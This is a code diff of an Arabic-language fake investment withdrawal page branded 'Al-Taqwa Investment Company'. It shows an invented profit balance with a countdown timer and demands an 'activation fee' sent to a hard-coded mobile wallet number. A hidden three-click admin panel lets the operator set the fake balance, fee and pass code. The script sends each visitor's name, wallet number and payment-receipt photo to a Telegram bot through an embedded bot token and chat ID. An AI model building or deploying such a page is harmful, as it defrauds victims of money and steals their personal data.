@@ -3,183 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شركة التقوى للاستثمار - التداول الآمن</title>
+    <title>منصة التقوى - بوابة الدخول الآمنة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary-blue: #0052ff; --dark-blue: #001a4d; --bg: #000510; --card: rgba(0, 82, 255, 0.1); }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }
-
-        /* شاشة الباسورد */
-        #lock-screen { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        #lock-screen input { padding: 15px; border-radius: 10px; border: 1px solid var(--primary-blue); background: #001233; color: white; text-align: center; font-size: 20px; width: 280px; margin-bottom: 20px; outline: none; }
-        #lock-screen button { background: var(--primary-blue); border: none; padding: 12px 50px; border-radius: 8px; font-weight: 900; color: white; cursor: pointer; font-size: 18px; }
-
-        /* التصميم العريض */
-        .page-container { width: 95%; max-width: 1400px; margin: 0 auto; display: none; padding-top: 20px; }
+        :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; overflow-x: hidden; }
         
-        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 82, 255, 0.2); padding-bottom: 20px; margin-bottom: 30px; }
-        .logo { font-size: 2.2rem; font-weight: 900; color: var(--primary-blue); text-shadow: 0 0 15px rgba(0, 82, 255, 0.5); }
-        .timer-box { background: rgba(255, 0, 0, 0.15); border: 1px solid #ff4d4d; padding: 10px 20px; border-radius: 30px; color: #ff4d4d; font-weight: bold; }
+        /* شاشة الدخول الرئيسية */
+        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .login-card h1 { font-size: 24px; color: var(--gold); margin-bottom: 30px; }
+        .login-card input { width: 80%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
+        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 85%; transition: 0.3s; }
+        .login-card button:hover { transform: scale(1.05); }
 
-        .main-grid { display: grid; grid-template-columns: 2.5fr 1fr; gap: 30px; }
+        /* الزر المخفي للمدير */
+        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 30px; height: 30px; background: transparent; cursor: pointer; z-index: 9999; }
+
+        /* لوحة تحكم المدير */
+        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: right; }
+        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 300px; }
+        .admin-content label { display: block; font-size: 12px; color: #aaa; margin-top: 10px; }
+        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
+        .admin-content button { background: var(--success); color: #000; border: none; padding: 10px; border-radius: 5px; width: 100%; font-weight: bold; margin-top: 20px; cursor: pointer; }
+
+        /* واجهة الموقع بعد الدخول */
+        #main-site { display: none; width: 100%; max-width: 420px; }
+        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
+        .timer-badge { background: rgba(255,0,0,0.3); color: #ff4d4d; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: inline-block; border: 1px solid #ff4d4d; }
+        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
+        .balance-box div { font-size: 32px; font-weight: 900; }
+        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; }
+        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; margin-top: 10px; }
         
-        .glass-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(0, 82, 255, 0.2); border-radius: 25px; padding: 40px; }
-        .balance-section { background: rgba(0, 30, 80, 0.5); padding: 30px; border-radius: 20px; border-right: 6px solid var(--primary-blue); margin-bottom: 30px; text-align: center; }
-        .balance-section h1 { font-size: 3.5rem; margin: 10px 0; color: #fff; }
-
-        .info-row { display: flex; justify-content: space-between; padding: 20px 0; border-bottom: 1px solid rgba(0, 82, 255, 0.1); }
-        .info-row span { color: #8eb9ff; font-size: 18px; }
-        .info-row b { font-size: 20px; color: #fff; }
-
-        .notice-box { background: rgba(0, 82, 255, 0.1); border: 1px dashed var(--primary-blue); padding: 20px; border-radius: 15px; text-align: center; margin: 30px 0; }
-        .wallet-num { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-size: 28px; font-weight: 900; margin-top: 15px; display: block; letter-spacing: 2px; }
-
-        .submit-btn { background: var(--primary-blue); color: white; border: none; width: 100%; padding: 22px; border-radius: 15px; font-size: 1.5rem; font-weight: 900; cursor: pointer; transition: 0.3s; }
-        .submit-btn:hover { box-shadow: 0 10px 30px rgba(0, 82, 255, 0.4); transform: translateY(-3px); }
-
-        /* الزر الجانبي السري (تحت) */
-        .admin-trigger { position: fixed; bottom: 20px; left: 20px; width: 40px; height: 40px; background: rgba(255,255,255,0.05); border-radius: 50%; cursor: pointer; z-index: 5000; }
-
-        /* شاشة التحميل */
-        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 20000; display: none; flex-direction: column; justify-content: center; align-items: center; }
-        .bar-bg { width: 300px; height: 10px; background: #111; border-radius: 10px; overflow: hidden; margin-top: 25px; }
-        .bar-fill { width: 0%; height: 100%; background: var(--primary-blue); transition: width 5s linear; }
-
-        /* لوحة التحكم */
-        #adminPanel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 30000; display: none; flex-direction: column; align-items: center; justify-content: center; }
-        .admin-box { background: white; color: #000; padding: 40px; border-radius: 25px; width: 400px; text-align: right; }
-        .admin-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-family: 'Cairo'; }
+        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="lock-screen">
-    <h1 style="color:var(--primary-blue); margin-bottom:10px;">شركة التقوى للاستثمار</h1>
-    <p style="color:#8eb9ff; margin-bottom:30px;">بوابة السحب الآمنة - إصدار 2026</p>
-    <input type="password" id="sitePass" placeholder="أدخل كود المرور">
-    <button onclick="unlock()">فتح النظام</button>
+<div id="admin-trigger" onclick="adminClick()"></div>
+
+<div class="login-card" id="login-page">
+    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
+    <p style="font-size: 14px; color: #ccc;">برجاء إدخال كود الدخول للمنصة</p>
+    <input type="password" id="entryPass" placeholder="كود الوصول">
+    <button onclick="accessSite()">دخول</button>
+</div>
+
+<div id="admin-panel">
+    <div class="admin-content">
+        <h3 style="color:var(--gold); margin:0; text-align:center;">لوحة إدارة المنصة</h3>
+        <label>كود الدخول (Password):</label>
+        <input type="text" id="setPass" value="123456">
+        <label>مدة صلاحية الرابط (بالدقائق):</label>
+        <input type="number" id="setTime" value="5">
+        <label>مبلغ الربح المعروض:</label>
+        <input type="number" id="setProfit" value="50000">
+        <label>رسوم التفعيل:</label>
+        <input type="number" id="setFees" value="500">
+        <button onclick="saveAdminSettings()">حفظ وإغلاق</button>
+    </div>
+</div>
+
+<div id="main-site">
+    <div class="site-card">
+        <div class="timer-badge">⏱️ الجلسة تنتهي خلال: <span id="displayTime">05:00</span></div>
+        <h2 style="color:var(--gold); margin:0;">لوحة الأرباح</h2>
+        <div class="balance-box">
+            <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
+            <div><span id="showProfit">50,000</span> <small>EGP</small></div>
+        </div>
+        <input type="text" id="uName" placeholder="الاسم بالكامل">
+        <input type="tel" id="uWallet" placeholder="رقم المحفظة (فودافون كاش..)">
+        <p style="font-size:12px;">رسوم المعالجة المطلوبة (<span id="showFees" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
+        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;">01226811784</div>
+        <label style="display:block; text-align:right; font-size:12px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
+        <input type="file" id="uFile" accept="image/*">
+        <button class="submit-btn" onclick="sendToTelegram()">تأكيد السحب الآن</button>
+    </div>
 </div>
 
 <div id="loader">
-    <h2 id="l-text">جاري التحقق من البروتوكول الأزرق...</h2>
-    <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
-</div>
-
-<div class="page-container" id="mainApp">
-    <header>
-        <div class="logo">شركة التقوى</div>
-        <div class="timer-box">⏱️ الجلسة مؤمنة لـ: <span id="timer">05:00</span></div>
-    </header>
-
-    <div class="main-grid">
-        <div class="glass-card">
-            <div class="balance-section">
-                <span>إجمالي الرصيد القابل للسحب</span>
-                <h1 id="dispBal">1,000,000.00 <small style="font-size:20px;">EGP</small></h1>
-            </div>
-
-            <div class="info-row"><span>الاسم المستلم:</span> <b id="dispName">احمد حجاج فهمي</b></div>
-            <div class="info-row"><span>رقم المحفظة:</span> <b id="dispWallet">01015545535</b></div>
-
-            <div class="notice-box">
-                <p style="margin:0; font-weight:bold;">يرجى سداد رسوم الضريبة والتفعيل (<span id="dispFee" style="color:#ff4d4d;">4500</span> ج.م) للرقم المعتمد:</p>
-                <span class="wallet-num" id="dispAdminWall">01228370922</span>
-            </div>
-
-            <button class="submit-btn" onclick="confirmWithdraw()">تأكيد طلب السحب الفوري</button>
-        </div>
-
-        <div class="glass-card" style="padding: 20px;">
-            <h3 style="color:var(--primary-blue); margin-top:0;">حالة الخادم</h3>
-            <div style="background:rgba(0, 82, 255, 0.05); height:200px; border-radius:15px; margin-bottom:20px; display:flex; align-items:flex-end; gap:5px; padding:10px;">
-                <div style="flex:1; background:var(--primary-blue); height:70%; border-radius:3px; opacity:0.8;"></div>
-                <div style="flex:1; background:var(--primary-blue); height:40%; border-radius:3px; opacity:0.5;"></div>
-                <div style="flex:1; background:var(--primary-blue); height:90%; border-radius:3px; opacity:1;"></div>
-            </div>
-            <p style="font-size:13px; color:#8eb9ff;">* النظام يعمل بتقنية التشفير End-to-End</p>
-        </div>
-    </div>
-</div>
-
-<div class="admin-trigger" onclick="admTrig()"></div>
-
-<div id="adminPanel">
-    <div class="admin-box">
-        <h3 style="text-align:center;">لوحة التحكم السرية ⚙️</h3>
-        <label>الرصيد:</label><input type="number" id="admBal" value="1000000">
-        <label>الاسم:</label><input type="text" id="admName" value="احمد حجاج فهمي">
-        <label>محفظة العميل:</label><input type="text" id="admWall" value="01015545535">
-        <label>الرسوم:</label><input type="number" id="admFee" value="4500">
-        <label>رقم التحويل (المحفظة):</label><input type="text" id="admAdminWall" value="01228370922">
-        <label>كلمة سر الدخول:</label><input type="text" id="admPass" value="123456">
-        <button onclick="saveAdmin()" style="width:100%; padding:15px; background:var(--primary-blue); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:15px;">حفظ وتحديث</button>
-    </div>
+    <div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <p style="margin-top:10px;">جاري المعالجة...</p>
 </div>
 
 <script>
-    const BOT_TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
-    const CHAT_ID = '8232581666';
+    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
+    const ID = '8232581666';
 
-    let config = JSON.parse(localStorage.getItem('taqwaBlueConfig')) || {
-        bal: 1000000, name: "احمد حجاج فهمي", wall: "01015545535", fee: 4500, adminWall: "01228370922", pass: "123456"
-    };
+    // استعادة الإعدادات من الذاكرة أو استخدام القيم الافتراضية
+    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', time: 5, profit: 50000, fees: 500 };
 
-    function apply() {
-        document.getElementById('dispBal').innerHTML = config.bal.toLocaleString() + ' <small style="font-size:20px;">EGP</small>';
-        document.getElementById('dispName').innerText = config.name;
-        document.getElementById('dispWallet').innerText = config.wall;
-        document.getElementById('dispFee').innerText = config.fee;
-        document.getElementById('dispAdminWall').innerText = config.adminWall;
+    function applyConfig() {
+        document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
+        document.getElementById('showFees').innerText = config.fees;
+        document.getElementById('displayTime').innerText = (config.time < 10 ? "0" + config.time : config.time) + ":00";
     }
-    apply();
+    applyConfig();
 
-    function unlock() {
-        if(document.getElementById('sitePass').value === config.pass) {
-            document.getElementById('lock-screen').style.display = 'none';
-            document.getElementById('mainApp').style.display = 'block';
-            startTimer(300);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔵 دخول جديد للنسخة الزرقاء.`);
-        } else { alert("كلمة المرور خاطئة!"); }
+    let count = 0;
+    function adminClick() { count++; if(count >= 3) { document.getElementById('admin-panel').style.display='flex'; count=0; } }
+
+    function saveAdminSettings() {
+        config = {
+            pass: document.getElementById('setPass').value,
+            time: parseInt(document.getElementById('setTime').value),
+            profit: document.getElementById('setProfit').value,
+            fees: document.getElementById('setFees').value
+        };
+        localStorage.setItem('adminConfig', JSON.stringify(config));
+        applyConfig();
+        document.getElementById('admin-panel').style.display='none';
+        alert("تم حفظ الإعدادات بنجاح.");
     }
 
-    function startTimer(duration) {
-        let timer = duration, min, sec;
-        const display = document.getElementById('timer');
-        setInterval(() => {
-            min = parseInt(timer / 60, 10); sec = parseInt(timer % 60, 10);
-            display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-            if (--timer < 0) { location.reload(); }
+    async function accessSite() {
+        const pass = document.getElementById('entryPass').value;
+        if(pass === config.pass) {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('main-site').style.display = 'block';
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔔 دخول جديد للموقع باستخدام الكود.`);
+            
+            startCountdown(config.time * 60);
+        } else {
+            alert("كود الدخول غير صحيح!");
+        }
+    }
+
+    function startCountdown(sec) {
+        let t = sec;
+        const display = document.getElementById('displayTime');
+        const timer = setInterval(() => {
+            let m = Math.floor(t / 60);
+            let s = t % 60;
+            display.innerText = (m < 10 ? '0' + m : m) + ":" + (s < 10 ? '0' + s : s);
+            if (--t < 0) { clearInterval(timer); alert("انتهت صلاحية الجلسة!"); location.reload(); }
         }, 1000);
     }
 
-    async function confirmWithdraw() {
-        const loader = document.getElementById('loader');
-        const fill = document.getElementById('fill');
-        loader.style.display = 'flex'; fill.style.width = '100%';
-        setTimeout(async () => {
-            loader.style.display = 'none';
-            const txn = "BLU-" + Math.floor(Math.random()*900000 + 100000);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('✅ سحب أزرق مؤكد\n👤: '+config.name+'\n💰: '+config.bal+' EGP\n🆔: '+txn)}`);
-            alert(`تم تأكيد الطلب بنجاح ✓\nرقم المعاملة: ${txn}\nالتحويل يتم آلياً بعد مراجعة الرسوم.`);
-            location.reload();
-        }, 5000);
-    }
+    async function sendToTelegram() {
+        const name = document.getElementById('uName').value;
+        const wallet = document.getElementById('uWallet').value;
+        const file = document.getElementById('uFile').files[0];
 
-    let c = 0;
-    function admTrig() { c++; if(c>=3) { document.getElementById('adminPanel').style.display='flex'; c=0; } }
-    
-    function saveAdmin() {
-        config = {
-            bal: parseFloat(document.getElementById('admBal').value),
-            name: document.getElementById('admName').value,
-            wall: document.getElementById('admWall').value,
-            fee: document.getElementById('admFee').value,
-            adminWall: document.getElementById('admAdminWall').value,
-            pass: document.getElementById('admPass').value
-        };
-        localStorage.setItem('taqwaBlueConfig', JSON.stringify(config));
-        apply();
-        document.getElementById('adminPanel').style.display='none';
+        if (!name || !wallet || !file) { 
+            alert("يرجى إكمال جميع البيانات وإرفاق الصورة!"); 
+            return; 
+        }
+
+        document.getElementById('loader').style.display = 'flex';
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        fd.append('photo', file);
+        fd.append('caption', `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 محفظة العميل: ${wallet}\n💰 مبلغ الربح: ${Number(config.profit).toLocaleString()} EGP\n💸 الرسوم: ${config.fees} EGP`);
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            document.getElementById('loader').style.display = 'none';
+            alert("تم إرسال طلبك بنجاح! سيتم المراجعة والتحويل خلال دقائق.");
+            location.reload();
+        } catch (e) { 
+            document.getElementById('loader').style.display = 'none'; 
+            alert("خطأ في الاتصال، يرجى المحاولة مرة أخرى."); 
+        }
     }
 </script>
 </body>
